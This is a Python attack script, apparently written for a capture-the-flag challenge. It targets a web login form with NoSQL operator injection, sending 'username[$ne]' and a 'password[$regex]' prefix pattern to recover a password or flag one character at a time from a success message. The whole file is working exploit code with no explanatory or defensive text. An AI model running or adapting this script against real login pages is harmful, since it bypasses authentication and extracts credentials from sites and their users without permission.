#!/usr/bin/env python3

import requests
import string
import sys

if len(sys.argv) != 2:
    print("[*] usage: python3 Extortion.py <url>")
    sys.exit(0)

url = sys.argv[1]
chars = string.printable
def bruter():
    global url,chars
    flag = ""
    while True:
        for char in chars:
            sess = requests.session()
            password_flag = f"{flag}{char}"
            sys.stdout.write(f"\r[+] Flag: {password_flag}")
            data = {"username[$ne]" : "musyoka",
                    "password[$regex]" : f"^{password_flag}"
                    }
            proxy =  {"http" : "http://127.0.0.1:8080"}
            verify = requests.post(url, data = data)
            bad_chars = ['*', '|', '+', '?', '.']
            if "Successful" in verify.text:
                if char in bad_chars:
                    pass
                elif char == "}":
                    flag += char
                    sys.exit(0)
                else:
                    flag += char
                    break
if __name__ == ("__main__"):
    bruter()
